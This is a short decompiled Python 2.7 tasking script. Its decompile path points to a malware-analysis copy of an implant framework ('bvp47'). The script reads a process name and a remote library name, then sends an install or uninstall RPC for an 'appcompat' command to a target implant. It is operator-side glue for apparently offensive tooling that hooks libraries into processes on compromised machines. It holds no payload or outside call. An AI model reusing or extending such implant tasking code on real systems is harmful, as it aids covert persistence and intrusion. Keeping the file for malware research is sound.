# uncompyle6 version 3.8.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:19:08) [MSC v.1500 32 bit (Intel)]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: Mcl_Cmd_AppCompat_Tasking.py


def TaskingMain(namespace):
    import mcl.imports, mcl.target, mcl.tasking
    from mcl.object.Message import MarshalMessage
    procedure = mcl.tasking.GetProcedureNumber()
    doInstall = True
    if procedure == 1:
        doInstall = False
    elif procedure != 0:
        mcl.tasking.EchoError('Unknown procedure (%u)' % procedure)
        return False
    mcl.imports.ImportWithNamespace(namespace, 'pc.cmd.appcompat', globals())
    mcl.imports.ImportWithNamespace(namespace, 'pc.cmd.appcompat.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if doInstall:
        tgtParams = pc.cmd.appcompat.InstallParams()
        tgtParams.procname = lpParams['procname']
        if lpParams['remotelibname'] != None:
            tgtParams.remotelibname = lpParams['remotelibname']
        rpc = pc.cmd.appcompat.tasking.RPC_INFO_REGISTER
    else:
        tgtParams = pc.cmd.appcompat.UninstallParams()
        if lpParams['remotelibname'] != None:
            tgtParams.remotelibname = lpParams['remotelibname']
        if lpParams['procname'] != None:
            tgtParams.procname = lpParams['procname']
        rpc = pc.cmd.appcompat.tasking.RPC_INFO_UNREGISTER
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, pc.cmd.appcompat.errorStrings)
        mcl.tasking.EchoError('Failed to perform call ' + str(res) + ' ' + str(pc.cmd.appcompat.errorStrings[res]))
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)
# okay decompiling D:\work\malware\bvp47\FB\Resources\Pc\PyScripts\Tasking\Mcl_Cmd_AppCompat_Tasking.pyo
